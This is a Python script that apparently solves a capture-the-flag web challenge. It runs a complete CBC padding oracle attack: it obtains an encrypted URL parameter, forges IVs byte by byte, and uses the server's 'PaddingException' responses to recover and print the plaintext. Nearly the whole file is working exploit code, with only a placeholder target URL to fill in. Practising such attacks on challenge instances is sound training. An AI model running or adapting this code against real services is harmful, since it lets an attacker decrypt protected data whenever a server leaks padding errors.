import requests
import base64
import random
import timeit

# This needs to be changed to your challenge instance
url = "http://add.your.ip.address/containertag/"


def main():
    start_time = timeit.default_timer()
    response, encoded_data = get_encrypted_bytes("title", "body")
    decrypted_blocks = []

    for block_nr in range(0, get_number_of_blocks(response) - 1):
        print(f"Decrypting block {block_nr + 1} of {get_number_of_blocks(response) - 1}:")
        print(f"Testing for pad len: ", end="")

        iv_old = get_byte_block(block_nr, response)
        c = get_byte_block(block_nr + 1, response)
        iv = get_rnd_iv_until_pad_bad(c)

        correct_test_bytes = [0] * 16
        x = [0] * 16
        m = [0] * 16

        current_byte_pos = 15
        while current_byte_pos >= 0:
            pad_len = 16 - current_byte_pos
            iv_new = set_iv_according_to_pad_len(iv, pad_len, correct_test_bytes)
            print(f"{pad_len} ", end="")
            for test_byte in range(0, 0xFF):
                iv_new = set_byte_at_pos_to(iv_new, current_byte_pos, test_byte)
                if is_padding_correct(iv_new + c):
                    correct_test_bytes[current_byte_pos] = test_byte
                    x[current_byte_pos] = pad_len ^ test_byte
                    m[current_byte_pos] = x[current_byte_pos] ^ iv_old[current_byte_pos]
                    break
            current_byte_pos -= 1

        decrypted_blocks.append(m)
        print("\nDecrypted so far: ")
        for decrypted_block in decrypted_blocks:
            print_block_chars(decrypted_block)
        print("\n")

    print("Plaintext: ", end="")
    for decrypted_block in decrypted_blocks:
        print_bytes(decrypted_block)

    param = encoded_data.replace("=", "~").replace("/", "!").replace("+", "-")
    print(f"param: {param}")
    print(f"bytes: {list(response)}")
    print(f"plaintext bytes: {list(decrypted_blocks)}")
    end_time = timeit.default_timer()
    print(f"\nThis took {int((end_time - start_time)/60)} minutes and {int((end_time - start_time)%60)} seconds.")


def get_encrypted_bytes(title, body):
    encoded_data = get_base64_encoded_data(title, body)
    decoded_data = base64.b64decode(encoded_data.encode("ascii"))
    return decoded_data, encoded_data


def get_base64_encoded_data(title, body):
    r = requests.post(url, data={"title": title, "body": body}).request.path_url.split("?post=")[1]
    return r.replace("~", "=").replace('!', '/').replace('-', '+')


def print_bytes(encrypted_bytes):
    for byte in encrypted_bytes:
        print(f"{byte:0{3}x}".upper(), end="")
    print(f" Bytes: {len(encrypted_bytes)}")


def bytes_to_param(decoded_data):
    encoded_data = base64.b64encode(decoded_data)
    return encoded_data.decode("ascii").replace("=", "~").replace("/", "!").replace("+", "-")


def get_number_of_blocks(byte_data):
    if len(byte_data) % 16 == 0:
        return int(len(byte_data) / 16)
    else:
        raise Exception("We have some blocks that are not 16 bytes long!")


def get_byte_block(block_nr, byte_data):
    return byte_data[16 * block_nr : 16 * (block_nr + 1)]


def send_enc_and_get_response(enc):
    r = requests.get(url, params={"post": enc})
    return str(r.content)


def is_padding_correct(data):
    html = send_enc_and_get_response(bytes_to_param(data))
    return "PaddingException" not in html


def set_byte_at_pos_to(data, pos, byte):
    data_list = list(data)
    data_list[pos] = byte
    return bytes(data_list)


def set_iv_according_to_pad_len(iv, pad_len, correct_test_bytes):
    new_iv = iv
    pos_counter = pad_len - 1
    while pos_counter > 0:
        byte_to_set = correct_test_bytes[-pos_counter] ^ pos_counter ^ pad_len
        new_iv = set_byte_at_pos_to(new_iv, -pos_counter, byte_to_set)
        pos_counter -= 1
    return new_iv


def get_rnd_iv():
    new_iv = []
    for rnd in range(0, 16):
        new_iv.append(random.randint(0, 255))
    return bytes(new_iv)


def get_rnd_iv_until_pad_bad(c):
    new_iv = get_rnd_iv()
    while is_padding_correct(new_iv + c):
        new_iv = get_rnd_iv()
    return new_iv


def print_block_chars(block):
    for byte in block:
        print(chr(byte), end="")


if __name__ == '__main__':
    main()
